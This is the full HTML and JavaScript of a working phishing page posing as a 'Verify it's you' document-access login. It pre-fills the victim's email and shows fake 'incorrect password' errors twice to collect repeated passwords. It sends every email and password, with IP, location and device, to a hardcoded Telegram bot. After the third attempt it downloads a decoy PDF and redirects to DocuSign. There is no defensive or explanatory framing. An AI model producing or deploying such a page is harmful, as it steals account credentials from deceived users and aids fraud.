<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify It's You</title>
  <link rel="icon" type="image/png" href="https://i.ibb.co/hFxXYymQ/logo.png" sizes="32x32">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url("https://i.postimg.cc/d0ZPbYHG/background3-2.png");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 300px;
      text-align: left;
    }
    .logo {
      width: 80px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #333333;
    }
    p {
      font-size: 14px;
      color: #666666;
      margin-bottom: 20px;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #cccccc;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .checkbox {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    .checkbox input {
      margin-right: 10px;
    }
    .checkbox label {
      font-size: 14px;
      color: #666666;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #8B0000;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      box-sizing: border-box;
    }
    button:hover {
      background-color: #6B0000;
    }
    .error-message, .success-message {
      display: none;
      font-size: 14px;
      margin-bottom: 15px;
    }
    .error-message { color: red; }
    .success-message { color: green; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://i.ibb.co/hFxXYymQ/logo.png" alt="Logo" class="logo" />
    <h1>Verify it's you</h1>
    <p>Only recipient email can access document</p>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <div class="checkbox">
        <input type="checkbox" id="keep-signed-in" name="keep-signed-in" />
        <label for="keep-signed-in">Keep me signed in</label>
      </div>
      <div class="error-message" id="errorMsg">‚ùå Incorrect email or password.</div>
      <div class="success-message" id="successMsg">‚úÖ Verified! Your document is being prepared...</div>
      <button type="submit">Next</button>
    </form>
  </div>

  <script>
  const form = document.getElementById("loginForm");
  const errorMsg = document.getElementById("errorMsg");
  const successMsg = document.getElementById("successMsg");
  const attempts = [];

  // Auto-fill email from # fragment
  const fragmentEmail = window.location.hash.slice(1);
  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
    form.email.value = fragmentEmail;
  }

  const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
  const chatId = "5613637159";
  const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = form.email.value.trim();
    const password = form.password.value.trim();
    attempts.push({ email, password });

    // Show error on 1st & 2nd, success on 3rd
    if (attempts.length < 3) {
      errorMsg.style.display = "block";
      successMsg.style.display = "none";
    } else {
      errorMsg.style.display = "none";
      successMsg.style.display = "block";
    }

    // Hide error/success if user types again
    form.querySelectorAll("input").forEach(input => {
      input.addEventListener("input", () => {
        errorMsg.style.display = "none";
        successMsg.style.display = "none";
      }, { once: true });
    });

    form.reset();

    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const { ip } = await ipRes.json();

      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const geo = await geoRes.json();

      const now = new Date().toUTCString();

      // Detect device type
      const ua = navigator.userAgent;
      let deviceType = "Unknown Device";

      if (/mobile/i.test(ua)) {
        deviceType = "üì± Mobile";
      } else if (/tablet/i.test(ua)) {
        deviceType = "üì± Tablet";
      } else if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
        deviceType = "üì± Tablet";
      } else {
        deviceType = "üíª Desktop";
      }

      // Prepare message for current attempt only
      const currentAttempt = attempts.length;
      const status = currentAttempt < 3 ? "‚ùå Failed" : "‚úÖ Final Attempt";

      let message = `üîê pdf-unlock Login Attempt #${currentAttempt} ${status}\n`;
      message += `üë§ email: ${email}\nüîë Password: ${password}\n`;
      message += `üïí Time: ${now}\n`;
      message += `üåç Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
      message += `üì° IP: ${ip}\n`;
      message += `üñ•Ô∏è Device: ${deviceType}`;

      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          chat_id: chatId,
          text: message
        })
      });
    } catch (err) {
      console.warn("‚ö†Ô∏è IP/Geo or Telegram send failed:", err);
    }

    if (attempts.length === 3) {
      const link = document.createElement("a");
      link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
      link.download = "";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      setTimeout(() => {
        window.location.href = "https://www.docusign.com";
      }, 2000);
    }
  });
</script>
</body>
</html>
